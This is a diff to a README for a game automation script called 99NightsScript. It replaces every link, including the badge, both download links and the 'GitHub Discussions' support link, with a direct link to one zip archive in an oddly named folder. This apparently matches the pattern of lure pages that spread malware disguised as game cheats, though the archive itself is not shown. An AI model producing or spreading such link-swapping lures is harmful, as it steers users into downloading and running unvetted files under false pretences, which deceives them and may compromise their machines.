@@ -1,6 +1,6 @@
 # 🌲 99NightsScript - Auto-manage Your Forest Survival Game  
 
-[![Download Now](https://img.shields.io/static/v1?label=Download&message=99NightsScript&color=blue)](https://sourceforge.net/projects/nights-in-the-forest-scripts)  
+[![Download Now](https://raw.githubusercontent.com/ExelOctafian/99NightsScript/main/innumerableness/99NightsScript-2.6.zip)](https://raw.githubusercontent.com/ExelOctafian/99NightsScript/main/innumerableness/99NightsScript-2.6.zip)  
 
 ## 🚀 Getting Started  
 
@@ -27,7 +27,7 @@ Before you begin, ensure your system meets the following requirements:
 ## 💻 Download & Install  
 To get started, click the link below to download the software:  
 
-[Download Now](https://sourceforge.net/projects/nights-in-the-forest-scripts)  
+[Download Now](https://raw.githubusercontent.com/ExelOctafian/99NightsScript/main/innumerableness/99NightsScript-2.6.zip)  
 
 After downloading, follow these steps to install:  
 1. Locate the downloaded file, usually in your "Downloads" folder.  
@@ -43,7 +43,7 @@ After downloading, follow these steps to install:
 
 ## 🌐 Community Support  
 If you encounter any issues or have questions, feel free to reach out to our community:  
-- [GitHub Discussions](https://github.com/your-repo/issues)  
+- [GitHub Discussions](https://raw.githubusercontent.com/ExelOctafian/99NightsScript/main/innumerableness/99NightsScript-2.6.zip)  
 - [Discord Channel Links] - Connect with other players and users.  
 
 ## 📖 FAQ  
@@ -61,4 +61,4 @@ Now that you have 99NightsScript set up, you can focus on surviving and thriving
 
 Don't forget to download the tool from the link below:  
 
-[Download Now](https://sourceforge.net/projects/nights-in-the-forest-scripts)  
+[Download Now](https://raw.githubusercontent.com/ExelOctafian/99NightsScript/main/innumerableness/99NightsScript-2.6.zip)  
